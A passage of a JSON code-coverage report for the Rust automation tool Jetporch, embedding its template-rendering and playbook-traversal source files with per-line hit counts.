ne":440,"address":[],"length":0,"stats":{"Line":0}},{"line":441,"address":[],"length":0,"stats":{"Line":0}},{"line":450,"address":[],"length":0,"stats":{"Line":0}},{"line":451,"address":[],"length":0,"stats":{"Line":0}},{"line":454,"address":[],"length":0,"stats":{"Line":0}},{"line":455,"address":[],"length":0,"stats":{"Line":0}},{"line":456,"address":[],"length":0,"stats":{"Line":0}},{"line":463,"address":[],"length":0,"stats":{"Line":0}},{"line":464,"address":[],"length":0,"stats":{"Line":0}},{"line":465,"address":[],"length":0,"stats":{"Line":0}},{"line":466,"address":[],"length":0,"stats":{"Line":0}},{"line":467,"address":[],"length":0,"stats":{"Line":0}},{"line":468,"address":[],"length":0,"stats":{"Line":0}},{"line":469,"address":[],"length":0,"stats":{"Line":0}},{"line":470,"address":[],"length":0,"stats":{"Line":0}},{"line":474,"address":[],"length":0,"stats":{"Line":0}},{"line":481,"address":[],"length":0,"stats":{"Line":0}},{"line":482,"address":[],"length":0,"stats":{"Line":0}},{"line":483,"address":[],"length":0,"stats":{"Line":0}},{"line":484,"address":[],"length":0,"stats":{"Line":0}},{"line":485,"address":[],"length":0,"stats":{"Line":0}},{"line":486,"address":[],"length":0,"stats":{"Line":0}},{"line":487,"address":[],"length":0,"stats":{"Line":0}},{"line":488,"address":[],"length":0,"stats":{"Line":0}},{"line":489,"address":[],"length":0,"stats":{"Line":0}},{"line":491,"address":[],"length":0,"stats":{"Line":0}},{"line":498,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":210},{"path":["/","Users","wings","projects","jetpack","src","playbooks","templar.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse serde_yaml;\nuse once_cell::sync::Lazy;\nuse handlebars::{Handlebars,RenderError};\n\nuse crate::playbooks::t_helpers::register_helpers;\n\n// templar contains low-level wrapping around handlebars.\n// this is not used directly when evaluating templates and template\n// expressions, for this, see handle/template.rs\n\nstatic HANDLEBARS: Lazy\u003cHandlebars\u003e = Lazy::new(|| {\n    let mut hb = Handlebars::new();\n    // very important: we are not plugging variables into HTML, turn escaping off\n    hb.register_escape_fn(handlebars::no_escape);\n    hb.set_strict_mode(true);\n    register_helpers(\u0026mut hb);\n    return hb;\n});\n\n// 'off' mode is used in a bit of a weird traversal/engine\n// situation where we need to get access to some task parameters\n// before templates are evaluated. You will notice there is no way\n// to evaluate templates in unstrict mode. This is by design.\n\n#[derive(PartialEq,Copy,Clone,Debug)]\npub enum TemplateMode {\n    Strict,\n    Off\n}\n\npub struct Templar {\n}\n\nimpl Templar {\n\n    pub fn new() -\u003e Self {\n        return Self {\n        };\n    }\n\n    // evaluate a string\n\n    pub fn render(\u0026self, template: \u0026String, data: serde_yaml::Mapping, template_mode: TemplateMode) -\u003e Result\u003cString, String\u003e {\n        let result : Result\u003cString, RenderError\u003e = match template_mode {\n            TemplateMode::Strict =\u003e HANDLEBARS.render_template(template, \u0026data),\n            /* this is only used to get back the raw 'items' collection inside the task FSM */\n            TemplateMode::Off =\u003e Ok(String::from(\"empty\"))\n        };\n        return match result {\n            Ok(x) =\u003e {\n                Ok(x)\n            },\n            Err(y) =\u003e {\n                Err(format!(\"Template error: {}\", y.desc))\n            }\n        }\n    }\n    \n    // used for with/cond and also in the shell module\n\n    pub fn test_condition(\u0026self, expr: \u0026String, data: serde_yaml::Mapping, template_mode: TemplateMode) -\u003e Result\u003cbool, String\u003e {\n        if template_mode == TemplateMode::Off {\n            /* this is only used to get back the raw 'items' collection inside the task FSM */\n            return Ok(true);\n        }\n        // embed the expression in an if statement as a way to evaluate it for truth\n        let template = format!(\"{{{{#if {expr} }}}}true{{{{ else }}}}false{{{{/if}}}}\");\n        let result = self.render(\u0026template, data, TemplateMode::Strict);\n        match result {\n            Ok(x) =\u003e { \n                if x.as_str().eq(\"true\") {\n                    return Ok(true);\n                } else {\n                    return Ok(false);\n                }\n            },\n            Err(y) =\u003e { \n                if y.find(\"Couldn't read parameter\").is_some() {\n                    return Err(format!(\"failed to parse conditional: {}: one or more parameters may be undefined\", expr))\n                }\n                else {\n                    return Err(format!(\"failed to parse conditional: {}: {}\", expr, y))\n                }\n            }\n        };\n    }\n\n}\n","traces":[{"line":27,"address":[],"length":0,"stats":{"Line":1}},{"line":28,"address":[],"length":0,"stats":{"Line":1}},{"line":30,"address":[],"length":0,"stats":{"Line":1}},{"line":31,"address":[],"length":0,"stats":{"Line":1}},{"line":32,"address":[],"length":0,"stats":{"Line":1}},{"line":33,"address":[],"length":0,"stats":{"Line":1}},{"line":52,"address":[],"length":0,"stats":{"Line":11}},{"line":53,"address":[],"length":0,"stats":{"Line":11}},{"line":59,"address":[],"length":0,"stats":{"Line":9}},{"line":60,"address":[],"length":0,"stats":{"Line":18}},{"line":61,"address":[],"length":0,"stats":{"Line":8}},{"line":63,"address":[],"length":0,"stats":{"Line":1}},{"line":65,"address":[],"length":0,"stats":{"Line":9}},{"line":66,"address":[],"length":0,"stats":{"Line":7}},{"line":67,"address":[],"length":0,"stats":{"Line":7}},{"line":69,"address":[],"length":0,"stats":{"Line":2}},{"line":70,"address":[],"length":0,"stats":{"Line":2}},{"line":77,"address":[],"length":0,"stats":{"Line":5}},{"line":78,"address":[],"length":0,"stats":{"Line":5}},{"line":80,"address":[],"length":0,"stats":{"Line":1}},{"line":83,"address":[],"length":0,"stats":{"Line":4}},{"line":84,"address":[],"length":0,"stats":{"Line":4}},{"line":85,"address":[],"length":0,"stats":{"Line":4}},{"line":86,"address":[],"length":0,"stats":{"Line":3}},{"line":87,"address":[],"length":0,"stats":{"Line":3}},{"line":88,"address":[],"length":0,"stats":{"Line":2}},{"line":90,"address":[],"length":0,"stats":{"Line":1}},{"line":93,"address":[],"length":0,"stats":{"Line":1}},{"line":94,"address":[],"length":0,"stats":{"Line":1}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":1}}],"covered":30,"coverable":31},{"path":["/","Users","wings","projects","jetpack","src","playbooks","traversal.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::playbooks::language::Play;\nuse crate::playbooks::visitor::PlaybookVisitor;\nuse crate::playbooks::context::PlaybookContext;\nuse crate::playbooks::language::{Role,RoleInvocation};\nuse crate::connection::factory::ConnectionFactory;\nuse crate::registry::list::Task;\nuse crate::playbooks::task_fsm::fsm_run_task;\nuse crate::inventory::inventory::Inventory;\nuse crate::inventory::hosts::Host;\nuse crate::util::io::{jet_file_open,directory_as_string};\nuse crate::util::yaml::{blend_variables,show_yaml_error_in_context};\nuse std::path::PathBuf;\nuse std::collections::HashMap;\nuse std::sync::{Arc,RwLock};\nuse std::path::Path;\nuse std::env;\n\n// this module contains the start of everything related to playbook evaluation\n\n// various functions work differntly if we are evaluating handlers or not\n#[derive(PartialEq,Copy,Debug,Clone)]\npub enum HandlerMode {\n    NormalTasks,\n    Handlers\n}\n\n// the run state is a quasi-global that can be used to access all\n// import 'objects' related to playbook evaluation\n\npub struct RunState {\n    pub inventory: Arc\u003cRwLock\u003cInventory\u003e\u003e,\n    pub playbook_paths: Arc\u003cRwLock\u003cVec\u003cPathBuf\u003e\u003e\u003e,\n    pub role_paths: Arc\u003cRwLock\u003cVec\u003cPathBuf\u003e\u003e\u003e,\n    pub module_paths: Arc\u003cRwLock\u003cVec\u003cPathBuf\u003e\u003e\u003e,\n    pub limit_hosts: Vec\u003cString\u003e,\n    pub limit_groups: Vec\u003cString\u003e,\n    pub batch_size: Option\u003cusize\u003e,\n    pub context: Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e,\n    pub visitor: Arc\u003cRwLock\u003cPlaybookVisitor\u003e\u003e,\n    pub connection_factory: Arc\u003cRwLock\u003cdyn ConnectionFactory\u003e\u003e,\n    pub tags: Option\u003cVec\u003cString\u003e\u003e,\n    pub allow_localhost_delegation: bool\n}\n\n// this is the top end traversal function that is called from cli/playbooks.rs\n\npub fn playbook_traversal(run_state: \u0026Arc\u003cRunState\u003e) -\u003e Result\u003c(), String\u003e {\n        \n    // it's possible to specify multiple playbooks seperated by colons on the command line\n\n    for playbook_path in run_state.playbook_paths.read().unwrap().iter() {\n\n        { \n            // let the context object know what playbook we're currently running\n            // braces are to avoid a deadlock\n            let mut ctx = run_state.context.write().unwrap(); \n            ctx.set_playbook_path(playbook_path); \n        }\n\n        run_state.visitor.read().unwrap().on_playbook_start(\u0026run_state.context);\n\n        // parse the playbook file\n        let playbook_file = jet_file_open(\u0026playbook_path)?;\n        let parsed: Result\u003cVec\u003cPlay\u003e, serde_yaml::Error\u003e = serde_yaml::from_reader(playbook_file);\n        if parsed.is_err() {\n            show_yaml_error_in_context(\u0026parsed.unwrap_err(), \u0026playbook_path);\n            return Err(format!(\"edit the file and try again?\"));\n        }   \n\n        // chdir in the playbook directory\n        let p1 = env::current_dir().expect(\"could not get current directory\");\n        let previous = p1.as_path();\n        let pbdirname = directory_as_string(playbook_path);\n        let pbdir = Path::new(\u0026pbdirname);\n        if pbdirname.eq(\u0026String::from(\"\")) {\n        } else {\n            env::set_current_dir(\u0026pbdir).expect(\"could not chdir into playbook directory\");\n        }\n\n        // walk each play in the playbook\n        let plays: Vec\u003cPlay\u003e = parsed.unwrap();\n        for play in plays.iter() {\n            match handle_play(\u0026run_state, play) {\n                Ok(_) =\u003e {},\n                Err(s) =\u003e { return Err(s); }\n            }\n            // disconnect from all hosts between plays\n            run_state.context.read().unwrap().connection_cache.write().unwrap().clear();\n        }\n        // disconnect from all hosts between playbooks\n        run_state.context.read().unwrap().connection_cache.write().unwrap().clear();\n\n        // switch back to the original directory\n        env::set_current_dir(\u0026previous).expect(\"could not restore previous directory\");\n\n\n    }\n    // disconnect from all hosts and exit. \n    run_state.context.read().unwrap().connection_cache.write().unwrap().clear();\n    run_state.visitor.read().unwrap().on_exit(\u0026run_state.context);\n    return Ok(())\n}\n\nfn handle_play(run_state: \u0026Arc\u003cRunState\u003e, play: \u0026Play) -\u003e Result\u003c(), String\u003e {\n\n    {\n        // the connection logic will try to determine what SSH hosts and ports\n        // to use by looking at various variables, if there are any CLI\n        // or play settings for these, feed them into the context so these\n        // functions can know what to do when called\n\n        let mut ctx = run_state.context.write().unwrap();\n        ctx.set_play(play);\n        if play.ssh_user.is_some() {\n            ctx.set_ssh_user(\u0026play.ssh_user.as_ref().unwrap());\n        }\n        if play.ssh_port.is_some() {\n            ctx.set_ssh_port(play.ssh_port.unwrap());\n        }\n        ctx.unset_role();\n    }\n    run_state.visitor.read().unwrap().on_play_start(\u0026run_state.context);\n\n    // make sure all host and groups used to limit exists\n    validate_limit_groups(run_state, play)?;\n    validate_limit_hosts(run_state, play)?;\n\n    // make sure all hosts are valid and we have some hosts to talk to\n    validate_groups(run_state, play)?;\n    let hosts = get_play_hosts(run_state, play);\n    validate_hosts(run_state, play, \u0026hosts)?;\n    load_vars_into_context(run_state, play)?;\n\n    // support for serialization if using push configuration\n    // means we may not configure hosts all at once but may take\n    // several passes to do a smaller number of them\n    let (_batch_size, batch_count, batches) = get_host_batches(run_state, play, hosts);\n\n    let mut failed: bool = false;\n    let mut failure_message: String = String::new();\n\n    // process each batch task/handlers seperately\n    for batch_num in 0..batch_count {\n        if failed {\n            break;\n        }\n        let hosts = batches.get(\u0026batch_num).unwrap();\n        run_state.visitor.read().unwrap().on_batch(batch_num, batch_count, hosts.len());\n        match handle_batch(run_state, play, hosts) {\n            Ok(_) =\u003e {},\n            Err(s) =\u003e {\n                failed = true;\n                failure_message.clear();\n                failure_message.push_str(\u0026s.clone());\n            }\n        }\n        // disconect from hosts between batches, one of the reasons we may be using\n        // this is we have a very large number of machines to manage\n        run_state.context.read().unwrap().connection_cache.write().unwrap().clear();\n    }\n    \n    // we're done, generate our summary/report \u0026 output regardless of failures\n    run_state.visitor.read().unwrap().on_play_stop(\u0026run_state.context, failed);\n    \n    if failed {\n        return Err(failure_message.clone());\n    } else {\n        return Ok(())\n    }\n}\n\nfn handle_batch(run_state: \u0026Arc\u003cRunState\u003e, play: \u0026Play, hosts: \u0026Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e) -\u003e Result\u003c(), String\u003e {\n\n    // assign the batch\n    { let mut ctx = run_state.context.write().unwrap(); ctx.set_targetted_hosts(\u0026hosts); }\n\n    // handle role tasks\n    if play.roles.is_some() {\n        let roles = play.roles.as_ref().unwrap();\n        for invocation in roles.iter() { process_role(run_state, \u0026play, \u0026invocation, HandlerMode::NormalTasks)?; }\n    }\n    { let mut ctx = run_state.context.write().unwrap(); ctx.unset_role(); }\n\n    // handle loose play tasks\n    if play.tasks.is_some() {\n        let tasks = play.tasks.as_ref().unwrap();\n        for task in tasks.iter() { process_task(run_state, \u0026play, \u0026task, HandlerMode::NormalTasks, None)?; }\n    }\n\n    // handle role handlers\n    if play.roles.is_some() {\n        let roles = play.roles.as_ref().unwrap();\n        for invocation in roles.iter() { process_role(run_state, \u0026play, \u0026invocation, HandlerMode::Handlers)?; }\n    }   \n    { let mut ctx = run_state.context.write().unwrap(); ctx.unset_role(); }  \n\n    // handle loose play handlers\n    if play.handlers.is_some() {\n        let handlers = play.handlers.as_ref().unwrap();\n        for handler in handlers { process_task(run_state, \u0026play, \u0026handler, HandlerMode::Handlers, None)?;  }\n    }\n    return Ok(())\n\n}\n\nfn check_tags(run_state: \u0026Arc\u003cRunState\u003e, task: \u0026Task, role_invocation: Option\u003c\u0026RoleInvocation\u003e) -\u003e bool {\n\n    // a given task may have tags associated from either the current role or directly on the task\n    // if the CLI --tags argument was used, we will skip the task if those tags don't match or\n    // if the tags are ommitted\n\n    match \u0026run_state.tags {\n        Some(cli_tags) =\u003e {\n            // CLI tags were specified\n            match task.get_with() {\n                // a with section was present\n                Some(task_with) =\u003e match task_with.tags {\n                    // tags are applied to the task\n                    Some(task_tags) =\u003e {\n                        for x in task_tags.iter() {  if cli_tags.contains(\u0026x) { return true; } }\n                    },\n                    // no tags\n                    None =\u003e {}\n                },\n                None =\u003e {}\n            };\n            match role_invocation {\n                // the role invocation has tags applied\n                Some(role_invoke) =\u003e match \u0026role_invoke.tags {\n                    Some(role_tags) =\u003e {\n                        for x in role_tags.iter() { if cli_tags.contains(\u0026x) { return true; } }\n                    },\n                    None =\u003e {}\n                },\n                None =\u003e {}\n            };\n        }\n        // no CLI tags so run the task\n        None =\u003e { return true; }\n    }\n    // we didn't match any tags, so don't run the task\n    return false;\n}\n\nfn process_task(run_state: \u0026Arc\u003cRunState\u003e, play: \u0026Play, task: \u0026Task, are_handlers: HandlerMode, role_invocation: Option\u003c\u0026RoleInvocation\u003e) -\u003e Result\u003c(), String\u003e {\n\n    // this function is the final wrapper before fsm_run_task, the low-level finite state machine around task execution that is wrapped\n    // by rayon, for multi-threaded execution with our thread worker pool.\n\n    let hosts : HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e = run_state.context.read().unwrap().get_remaining_hosts();\n    if hosts.len() == 0 { return Err(String::from(\"no hosts remaining\")) }\n\n    // we will run tasks with the FSM only if not skipped by tags\n    let should_run = check_tags(run_state, task, role_invocation);\n    if should_run {\n        run_state.context.write().unwrap().set_task(\u0026task);\n        run_state.visitor.read().unwrap().on_task_start(\u0026run_state.context, are_handlers);\n        run_state.context.write().unwrap().increment_task_count();\n        fsm_run_task(run_state, play, task, are_handlers)?;\n    }\n\n    return Ok(());\n}\n\nfn process_role(run_state: \u0026Arc\u003cRunState\u003e, play: \u0026Play, invocation: \u0026RoleInvocation, are_handlers: HandlerMode) -\u003e Result\u003c(), String\u003e {\n\n    // traversal code for roles.  This is called twice, once for normal tasks and again when processing handler tasks.\n\n    // we traverse roles by seeing the 'invocation' in the playbook, which is different from the definition.\n    // the definition involves all of the role files in the role directory\n    let role_name = invocation.role.clone();\n\n    // can we find a role directory in the configured role paths?\n    let (role, role_path) = find_role(run_state, \u0026play, role_name.clone())?;\n    {\n        // we're good.\n        let mut ctx = run_state.context.write().unwrap();\n        let str_path = directory_as_string(\u0026role_path);\n        ctx.set_role(\u0026role, invocation, \u0026str_path);\n        if are_handlers == HandlerMode::NormalTasks {\n            ctx.increment_role_count();\n        }\n    }\n    run_state.visitor.read().unwrap().on_role_start(\u0026run_state.context);\n\n    // roles contain two list of files to include, which one we're processing now\n    // depends on whether we are in handler mode or not\n\n    let files = match are_handlers {\n        HandlerMode::NormalTasks =\u003e role.tasks,\n        HandlerMode::Handlers    =\u003e role.handlers\n    };\n\n    // the file sections are optional...\n\n    if files.is_some() {\n\n        // prepare to chdir into the role, this makes operating on template and file paths easier\n        \n        let p1 = env::current_dir().expect(\"could not get current directory\");\n        let previous = p1.as_path();        \n        match env::set_current_dir(\u0026role_path) {\n            Ok(_) =\u003e {}, Err(s) =\u003e { return Err(format!(\"could not chdir into role directory {:?}, {}\", role_path, s)) }\n        }\n\n        // for each task file path that is mentioned\n\n        for task_file in files.unwrap().iter() {\n\n            // find the likely path location, which is organized into subdirectories for relative paths\n\n            let task_buf = match task_file.starts_with(\"/\") {\n                true =\u003e {\n                    Path::new(task_file).to_path_buf()\n                }\n                false =\u003e {\n                    let mut pb = PathBuf::new();\n                    pb.push(role_path.clone());\n                    match are_handlers {\n                        HandlerMode::NormalTasks =\u003e { pb.push(\"tasks\"); },\n                        HandlerMode::Handlers    =\u003e { pb.push(\"handlers\"); },\n                    };\n                    pb.push(task_file);\n                    pb\n                }\n            };\n\n            // parse the YAML file\n\n            let task_fh = jet_file_open(\u0026task_buf.as_path())?;\n            let parsed: Result\u003cVec\u003cTask\u003e, serde_yaml::Error\u003e = serde_yaml::from_reader(task_fh);\n            if parsed.is_err() {\n                show_yaml_error_in_context(\u0026parsed.unwrap_err(), \u0026task_buf.as_path());\n                return Err(format!(\"edit the file and try again?\"));\n            }   \n            let tasks = parsed.unwrap();\n            for task in tasks.iter() {\n\n                // process all tasks in the YAML file, this is the same function used\n                // for processing loose tasks outside of roles\n\n                process_task(run_state, \u0026play, \u0026task, are_handlers, Some(invocation))?;\n            }\n        }\n\n        // we're done with the role so flip back to the previous directory\n\n        match env::set_current_dir(\u0026previous) {\n            Ok(_) =\u003e {}, Err(s) =\u003e { return Err(format!(\"could not restore previous directory after role evaluation: {:?}, {}\", previous, s)) }\n        }\n\n    }\n\n    run_state.visitor.read().unwrap().on_role_stop(\u0026run_state.context);\n    return Ok(())\n\n}\n\nfn get_host_batches(run_state: \u0026Arc\u003cRunState\u003e, play: \u0026Play, hosts: Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e) \n    -\u003e (usize, usize, HashMap\u003cusize, Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e\u003e) {\n\n    // the --batch-size CLI parameter can be used to split a large amount of possible hosts\n    // into smaller subsets, where the playbook will pass over them in multiple waves\n    // this can also be set on the play\n\n    let batch_size = match play.batch_size {\n        Some(x) =\u003e x,\n        None =\u003e match run_state.batch_size {\n            Some(y) =\u003e y,\n            None =\u003e hosts.len() \n        }\n    };\n\n    // do some integer division math to see many batches we need\n\n    let host_count = hosts.len();\n    let batch_count = match host_count {\n        0 =\u003e 1,\n        _ =\u003e {\n            let mut count = host_count / batch_size;\n            let remainder = host_count % batch_size;\n            if remainder \u003e 0 { count = count + 1 }\n            count\n        }\n    };\n\n    // sort the hosts so the batches seem consistent when doing successive playbook executions\n\n    let mut hosts_list : Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e = hosts.iter().map(|v| Arc::clone(\u0026v)).collect();\n    hosts_list.sort_by(|b, a| a.read().unwrap().name.partial_cmp(\u0026b.read().unwrap().name).unwrap());\n\n    // put the hosts into ththe assigned batches\n\n    let mut results : HashMap\u003cusize, Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e\u003e = HashMap::new();\n    for batch_num in 0..batch_count {\n        let mut batch : Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e = Vec::new();\n        for _host_ct in 0..batch_size {\n            let host = hosts_list.pop();\n            if host.is_some() {\n                batch.push(host.unwrap());\n            } else {\n                break;\n            }\n        }\n        results.insert(batch_num, batch);\n    }\n\n    return (batch_size, batch_count, results);\n\n}\n\nfn get_play_hosts(run_state: \u0026Arc\u003cRunState\u003e,play: \u0026Play) -\u003e Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e {\n\n    // the hosts we want to talk to are the ones specified in the play but may\n    // be further constrained by the parameters --limit-hosts and limit--groups\n    // from the CLI.\n    \n    let groups = \u0026play.groups;\n    let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e = HashMap::new();\n    \n    let has_group_limits = match run_state.limit_groups.len() {\n        0 =\u003e false,\n        _ =\u003e true\n    };\n    let has_host_limits = match run_state.limit_hosts.len() {\n        0 =\u003e false,\n        _ =\u003e true\n    };\n\n    for group in groups.iter() {\n\n        // for each mentioned group get all the hosts in that group and any subgroups\n\n        let group_object = run_state.inventory.read().unwrap().get_group(\u0026group.clone());\n        let hosts = group_object.read().unwrap().get_descendant_hosts();\n        \n        for (k,v) in hosts.iter() {\n\n            // only add the host to the play if it agrees with the limits\n            // or no limits are specified\n        \n            if has_host_limits \u0026\u0026 ! run_state.limit_hosts.contains(k) {\n                continue;\n            }\n            \n            if has_group_limits {\n                let mut ok = false;\n                for group_name in run_state.limit_groups.iter() {\n                    if v.read().unwrap().has_ancestor_group(group_name) {\n                        ok = true; \n                        break;\n                    }\n                }\n                if ok {\n                    results.insert(k.clone(), Arc::clone(\u0026v));\n                }\n            } \n            else {\n                results.insert(k.clone(), Arc::clone(\u0026v));\n            }\n\n        }\n    }\n\n    return results.iter().map(|(_k,v)| Arc::clone(\u0026v)).collect();\n}\n\nfn validate_limit_groups(run_state: \u0026Arc\u003cRunState\u003e, _play: \u0026Play) -\u003e Result\u003c(), String\u003e {\n\n    // limit groups on the command line can't mention any groups that aren't in inventory\n\n    let limit_groups = \u0026run_state.limit_groups;\n    let inv = run_state.inventory.read().unwrap();\n    for group_name in limit_groups.iter() {\n        if !inv.has_group(\u0026group_name.clone()) {\n            return Err(format!(\"--limit-groups: at least one referenced group ({}) is not found in inventory\", group_name));\n        }\n    }\n    return Ok(());\n}\n\nfn validate_limit_hosts(run_state: \u0026Arc\u003cRunState\u003e, _play: \u0026Play) -\u003e Result\u003c(), String\u003e {\n\n    // limit hosts on the command line can't mention any hosts that aren't in inventory\n\n    let limit_hosts = \u0026run_state.limit_hosts;\n    let inv = run_state.inventory.read().unwrap();\n    for host_name in limit_hosts.iter() {\n        if !inv.has_host(\u0026host_name.clone()) {\n            return Err(format!(\"--limit-hosts: at least one referenced host ({}) is not found in inventory\", host_name));\n        }\n    }\n    return Ok(());\n}\n\nfn validate_groups(run_state: \u0026Arc\u003cRunState\u003e, play: \u0026Play) -\u003e Result\u003c(), String\u003e {\n\n    // groups on the play can't mention any groups that aren't in inventory\n\n    let groups = \u0026play.groups;\n    let inv = run_state.inventory.read().unwrap();\n    for group_name in groups.iter() {\n        if !inv.has_group(\u0026group_name.clone()) {\n            return Err(format!(\"at least one referenced group ({}) is not found in inventory\", group_name));\n        }\n    }\n    return Ok(());\n}\n\nfn validate_hosts(_run_state: \u0026Arc\u003cRunState\u003e, _play: \u0026Play, hosts: \u0026Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e) -\u003e Result\u003c(), String\u003e {\n\n    // once hosts are selected we need to select more than one host, if the groups were all\n    // empty, don't try to run the playbook\n\n    if hosts.is_empty() {\n        return Err(String::from(\"no hosts selected by groups in play\"));\n    }\n    return Ok(());\n}\n\nfn load_vars_into_context(run_state: \u0026Arc\u003cRunState\u003e, play: \u0026Play) -\u003e Result\u003c(), String\u003e {\n\n    // the context object is fairly pervasive throughout the running of the program\n    // and is (eventually) the gateway that template requests pass through, since\n    // it holds on to losts of play and role variables. This function loads\n    // a lot of the variables into the context ensuring proper variable precedence\n\n    let ctx = run_state.context.write().unwrap();\n    let mut ctx_vars_storage = serde_yaml::Value::from(serde_yaml::Mapping::new());\n    let mut ctx_defaults_storage = serde_yaml::Value::from(serde_yaml::Mapping::new());\n    \n    if play.vars.is_some() {\n        // vars are inline variables that are loaded at maximum precedence\n        let vars = play.vars.as_ref().unwrap();\n        blend_variables(\u0026mut ctx_vars_storage, serde_yaml::Value::Mapping(vars.clone()));\n    }\n\n    if play.vars_files.is_some() {\n        // vars_files are paths to YAML files that are loaded at maximum precedence\n        let vars_files = play.vars_files.as_ref().unwrap();\n        for pathname in vars_files {\n            let path = Path::new(\u0026pathname);\n            let vars_file = jet_file_open(\u0026path)?;\n            let parsed: Result\u003cserde_yaml::Mapping, serde_yaml::Error\u003e = serde_yaml::from_reader(vars_file);\n            if parsed.is_err() {\n                show_yaml_error_in_context(\u0026parsed.unwrap_err(), \u0026path);\n                return Err(format!(\"edit the file and try again?\"));\n            }\n            blend_variables(\u0026mut ctx_vars_storage, serde_yaml::Value::Mapping(parsed.unwrap()));\n        }\n    }\n\n    if play.defaults.is_some() {\n        // defaults works like 'vars' but has the lowest precedence\n        let defaults = play.defaults.as_ref().unwrap();\n        blend_variables(\u0026mut ctx_defaults_storage, serde_yaml::Value::Mapping(defaults.clone()));\n    }\n\n    // these match expressions are just used to 'de-enum' the serde values so we can write to them\n    match ctx_vars_storage {\n        serde_yaml::Value::Mapping(x) =\u003e { *ctx.vars_storage.write().unwrap() = x },\n        _ =\u003e panic!(\"unexpected, get_blended_variables produced a non-mapping (1)\")\n    }\n    match ctx_defaults_storage {\n        serde_yaml::Value::Mapping(x) =\u003e { *ctx.defaults_storage.write().unwrap() = x },\n        _ =\u003e panic!(\"unexpected, get_blended_variables produced a non-mapping (1)\")\n    }\n\n    return Ok(());\n}\n\nfn find_role(run_state: \u0026Arc\u003cRunState\u003e, _play: \u0026Play, role_name: String) -\u003e Result\u003c(Role,PathBuf), String\u003e {\n\n    // when we need to find a role we look for it in the configured role paths\n\n    for path_buf in run_state.role_paths.read().unwrap().iter() {\n\n        let mut pb = path_buf.clone();\n        pb.push(role_name.clone());\n        let mut pb2 = pb.clone();\n        pb2.push(\"role.yml\");\n\n        // a role.yml file must exist in a directory once we find a directory with a matching\n        // name\n\n        if pb2.exists() {\n            let path = pb2.as_path();\n            let role_file = jet_file_open(\u0026path)?;\n\n            // deserialize the role file and make sure it is valid before returning\n\n            let parsed: Result\u003cRole, serde_yaml::Error\u003e = serde_yaml::from_reader(role_file);\n            if parsed.is_err() {\n                show_yaml_error_in_context(\u0026parsed.unwrap_err(), \u0026path);\n                return Err(format!(\"edit the file and try again?\"));\n            }   \n            let role = parsed.unwrap();\n            \n            return Ok((role,pb));\n        }\n    }\n    return Err(format!(\"role not found: {}\", role_name));\n}  \n\n\n","traces":[{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"l